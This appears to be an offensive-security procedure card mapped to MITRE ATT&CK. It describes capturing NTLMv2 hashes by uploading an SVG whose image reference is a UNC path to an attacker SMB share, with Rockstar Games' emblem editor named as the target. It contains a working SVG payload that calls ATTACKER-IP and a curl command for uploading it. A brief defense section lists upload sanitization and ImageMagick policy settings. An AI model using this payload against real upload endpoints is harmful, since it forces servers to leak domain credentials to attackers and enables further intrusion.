---
id: proc-uuid-1
name: Craft-and-Submit-Malicious-SVG-with-UNC-Paths
tags:
  - ssrf
  - svg
  - upload
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:09.067Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-and-Submit-Malicious-SVG-with-UNC-Paths

## Summary

This procedure involves creating and uploading SVG files embedded with UNC paths to exploit SSRF in applications using ImageMagick for processing, causing the server to make outbound SMB connections to attacker-controlled endpoints.

## Description

In the context of Rockstar Games' emblem editor, the vulnerability stems from ImageMagick and librsvg failing to validate UNC paths in SVG files. By crafting an SVG that references an external image via a UNC path (e.g., `\\attacker-ip\share\dummy.png`), the server attempts to fetch it over SMB, authenticating with its domain credentials. This exposes NTLMv2 hashes without requiring direct server access.

## Requirements

1. Access to the web application's SVG upload feature (e.g., logged-in user)
2. Attacker-controlled IP reachable by the target server on port 445
3. Text editor or SVG crafting tool

## Defense

Defensive measures and detection strategies:

- Validate and sanitize file uploads to block UNC paths and external references in SVGs
- Configure ImageMagick with policy files to restrict network access (e.g., `domain XML file https http://` set to none)
- Monitor outbound SMB traffic from web servers and block non-essential connections

## Objectives

1. Trigger SSRF to initiate unauthorized outbound requests
2. Force server authentication to attacker endpoint
3. Expose credentials for further exploitation

## Instructions

### Step 1: Craft the Malicious SVG

**Context**: Create an SVG file that includes an image element pointing to a UNC path, tricking the renderer into resolving it via SMB.

No specific command; use a text editor to write:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <image x="0" y="0" width="100" height="100" xlink:href="file://\\ATTACKER-IP\share\dummy.png"/>
</svg>
```

> This SVG references a non-existent image on the attacker's SMB share, causing ImageMagick to authenticate during fetch.

### Step 2: Submit the SVG

**Context**: Upload the crafted file to the vulnerable endpoint, such as the emblem editor.

Use the web interface or [[curl-upload-svg]] if API available:

```bash
curl -X POST -F "file=@malicious.svg" https://target.com/emblem/upload
```

> Successful upload triggers server-side processing and SSRF.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

-

## Commands Used

-

## Tools Used

-

## Tags

- ssrf
- svg
- upload
